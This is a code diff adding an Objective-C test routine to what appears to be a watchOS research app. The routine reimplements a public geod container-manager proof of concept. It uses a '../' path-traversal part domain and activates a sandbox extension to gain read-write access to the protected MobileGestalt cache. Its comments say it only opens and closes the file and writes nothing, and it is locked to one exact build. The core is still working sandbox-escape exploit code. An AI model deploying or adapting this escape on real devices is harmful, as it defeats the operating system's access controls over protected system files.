@@ -5,6 +5,7 @@
 #import <errno.h>
 #import <fcntl.h>
 #import <stdint.h>
+#import <stdbool.h>
 #import <stdlib.h>
 #import <string.h>
 #import <sys/stat.h>
@@ -223,5 +224,151 @@ NSString *BQRunKAMUI26WriteOpenTest(void) {
                   error.localizedDescription ?: @"unknown"];
     }
     NSLog(@"[KAMUI26WriteOpen]\n%@\n[/KAMUI26WriteOpen]", report);
+    return report;
+}
+
+
+// MARK: - Exact externally documented geod MCM variant (23U95, opt-in).
+// Unlike the existing BQCore.m fallback with twelve '..' components and
+// sandbox_extension_consume(), this matches the public six-component class-12
+// geod PoC's container-object activation API.
+//
+// This is a REAL AUTHORIZATION TEST, not a protected mutation. It calls
+// open(O_RDWR|O_NOFOLLOW) and immediately closes the fd. It performs NO
+// write/pwrite/truncate/unlink/rename/rebuild against protected files.
+// Reference: https://github.com/0xjohnnydev/Geod-MCM-PoC
+
+typedef void *(*BQWOObjectCopy)(void *);
+typedef void (*BQWOObjectFree)(void *);
+typedef const char *(*BQWOObjectPath)(void *);
+typedef bool (*BQWOObjectActivate)(void *, bool);
+
+static NSString *BQWOReadWriteOpenOnly(NSString *path) {
+    errno = 0;
+    int fd = open(path.fileSystemRepresentation, O_RDWR | O_NOFOLLOW | O_CLOEXEC);
+    int failure = errno;
+    if (fd < 0) {
+        return [NSString stringWithFormat:@"DENIED errno=%d (%s)", failure, strerror(failure)];
+    }
+    close(fd);
+    return @"ALLOWED: O_RDWR fd opened and immediately closed, NO BYTES WRITTEN";
+}
+
+NSString *BQRunGeodExactReadWriteOpenTest(void) {
+    NSMutableArray<NSString *> *out = [NSMutableArray arrayWithObjects:
+        @"=== watchOS 26.6.1 exact geod Class12 MCM O_RDWR check ===",
+        @"Real container-object activation; NO PROTECTED DATA WRITES.",
+        @"Matches public six-parent PoC (not old twelve-parent BQCore fallback).",
+        nil];
+    NSString *path = BQMobileGestaltPath();
+    NSString *expectedDirectory = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
+    NSString *partDomain = @"../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
+    NSString *before = BQWOMetadata(path);
+    NSString *build = BQWOOSBuild();
+    [out addObject:[NSString stringWithFormat:@"Build=%@ OS=%@", build,
+                    NSProcessInfo.processInfo.operatingSystemVersionString]];
+    [out addObject:[NSString stringWithFormat:@"Protected before: %@", before]];
+    if (![build isEqualToString:@"23U95"] ||
+        NSProcessInfo.processInfo.operatingSystemVersion.majorVersion != 26 ||
+        ![path.stringByDeletingLastPathComponent isEqualToString:expectedDirectory]) {
+        [out addObject:@"STOP: this controlled test only supports exact Watch6,18 watchOS26.6.1 path and build"];
+        return [out componentsJoinedByString:@"\n"];
+    }
+
+    void *manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    if (!manager) {
+        [out addObject:@"STOP: MCM dylib unavailable"];
+        return [out componentsJoinedByString:@"\n"];
+    }
+
+    BQWOCreate create = (BQWOCreate)dlsym(manager, "container_query_create");
+    BQWOSetNumber setClass = (BQWOSetNumber)dlsym(manager, "container_query_set_class");
+    BQWOSetObject setIDs = (BQWOSetObject)dlsym(manager, "container_query_set_identifiers");
+    BQWOSetNumber setFlags = (BQWOSetNumber)dlsym(manager, "container_query_operation_set_flags");
+    BQWOSetNumber setPart = (BQWOSetNumber)dlsym(manager, "container_query_operation_set_part");
+    BQWOSetPartDomain setDomain = (BQWOSetPartDomain)dlsym(manager, "container_query_operation_set_part_domain");
+    BQWOResult one = (BQWOResult)dlsym(manager, "container_query_get_single_result");
+    BQWOFree freeQuery = (BQWOFree)dlsym(manager, "container_query_free");
+    BQWOObjectCopy copyObject = (BQWOObjectCopy)dlsym(manager, "container_object_copy");
+    BQWOObjectFree freeObject = (BQWOObjectFree)dlsym(manager, "container_object_free");
+    BQWOObjectPath objectPath = (BQWOObjectPath)dlsym(manager, "container_object_get_path");
+    BQWOObjectActivate activate = (BQWOObjectActivate)dlsym(manager, "container_object_sandbox_extension_activate");
+    BQWOXPCString makeString = (BQWOXPCString)dlsym(RTLD_DEFAULT, "xpc_string_create");
+    BQWOXPCRelease releaseString = (BQWOXPCRelease)dlsym(RTLD_DEFAULT, "xpc_release");
+    BQWOCheck sandbox = (BQWOCheck)dlsym(RTLD_DEFAULT, "sandbox_check");
+    void *sandboxLibrary = NULL;
+    if (!sandbox) {
+        sandboxLibrary = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY | RTLD_LOCAL);
+        if (sandboxLibrary) sandbox = (BQWOCheck)dlsym(sandboxLibrary, "sandbox_check");
+    }
+
+    [out addObject:[NSString stringWithFormat:@"MCM entrypoints: identifiers=%@ partDomain=%@ objectActivate=%@",
+        setIDs ? @"YES" : @"NO", setDomain ? @"YES" : @"NO", activate ? @"YES" : @"NO"]];
+    [out addObject:[NSString stringWithFormat:@"Baseline policy=%@; O_RDWR=%@",
+        BQWOSandboxStatus(sandbox, path), BQWOReadWriteOpenOnly(path)]];
+    if (!(create && setClass && setIDs && setFlags && setPart && setDomain &&
+          one && freeQuery && copyObject && freeObject && objectPath &&
+          activate && makeString && releaseString)) {
+        [out addObject:@"STOP: missing exact PoC API; do not substitute a different ABI"];
+    } else {
+        void *q = create();
+        if (!q) {
+            [out addObject:@"STOP: MCM query-create failed"];
+        } else {
+            void *identifier = makeString("com.apple.geod");
+            if (!identifier) {
+                [out addObject:@"STOP: unable to make geod identifier"];
+            } else {
+                setClass(q, 12);
+                setIDs(q, identifier);
+                setFlags(q, 0x8100000000ULL);
+                setPart(q, 3);
+                setDomain(q, partDomain.UTF8String);
+                releaseString(identifier);
+                void *borrowed = one(q);
+                void *object = borrowed && copyObject ? copyObject(borrowed) : NULL;
+                [out addObject:[NSString stringWithFormat:@"Class12 query result=%@", object ? @"YES" : @"NO"]];
+                if (object) {
+                    const char *rawPath = objectPath(object);
+                    NSString *returned = rawPath ? [NSString stringWithUTF8String:rawPath] : @"";
+                    NSString *resolved = returned.stringByStandardizingPath;
+                    if ([resolved isEqualToString:@"/var"] || [resolved hasPrefix:@"/var/"]) {
+                        resolved = [@"/private" stringByAppendingString:resolved];
+                    }
+                    BOOL exact = [resolved isEqualToString:expectedDirectory];
+                    [out addObject:[NSString stringWithFormat:@"Returned-path matches target=%@", exact ? @"YES" : @"NO"]];
+                    // Never activate a token unless it resolves to the intended
+                    // exact target directory. No raw token is logged.
+                    if (exact) {
+                        BOOL active = activate(object, false);
+                        [out addObject:[NSString stringWithFormat:@"container_object_activate=%@", active ? @"YES" : @"NO"]];
+                        if (active) {
+                            [out addObject:[NSString stringWithFormat:@"Activated policy=%@; actual O_RDWR=%@",
+                                BQWOSandboxStatus(sandbox, path), BQWOReadWriteOpenOnly(path)]];
+                        }
+                    }
+                    freeObject(object); // revokes object-backed extension
+                    [out addObject:[NSString stringWithFormat:@"After object release policy=%@; O_RDWR=%@",
+                        BQWOSandboxStatus(sandbox, path), BQWOReadWriteOpenOnly(path)]];
+                }
+            }
+            freeQuery(q);
+        }
+    }
+    if (sandboxLibrary) dlclose(sandboxLibrary);
+    dlclose(manager);
+    NSString *after = BQWOMetadata(path);
+    [out addObject:[NSString stringWithFormat:@"Protected after: %@", after]];
+    [out addObject:[NSString stringWithFormat:@"Metadata unchanged=%@",
+        [before isEqualToString:after] ? @"YES" : @"NO: REVIEW BEFORE REPEATING"]];
+    [out addObject:@"Result can prove writable-descriptor authorization only, never a persistent MobileGestalt modification."];
+    [out addObject:@"No protected bytes were modified or deleted."];
+    NSString *report = [out componentsJoinedByString:@"\n"];
+    NSString *reportPath = [BQDocuments() stringByAppendingPathComponent:@"geod-exact-open-only.txt"];
+    NSError *error = nil;
+    if (![report writeToFile:reportPath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
+        report = [report stringByAppendingFormat:@"\nSAVE_FAILED=%@", error.localizedDescription];
+    }
+    NSLog(@"[GeodExactReadWriteOpen]\n%@\n[/GeodExactReadWriteOpen]", report);
     return report;
 }
